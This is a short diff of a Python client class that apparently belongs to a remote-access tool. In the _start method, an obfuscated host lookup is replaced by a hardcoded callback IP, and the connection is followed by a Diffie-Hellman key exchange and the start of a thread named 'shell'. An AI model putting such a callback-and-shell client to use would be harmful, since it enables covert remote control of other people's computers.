@@ -546,7 +546,7 @@ class Client(object):
 
     def _start(self):
         try:
-            self._socket  = self._connect(host=self._target(o=self.__a__, p=self.__b__))
+            self._socket  = self._connect('192.178.1.70') #host=self._target(o=self.__a__, p=self.__b__))
             self._dhkey   = self._diffiehellman()
             self._threads['shell'] = threading.Thread(target=self.shell, name='shell')
             self.standby.status.clear()
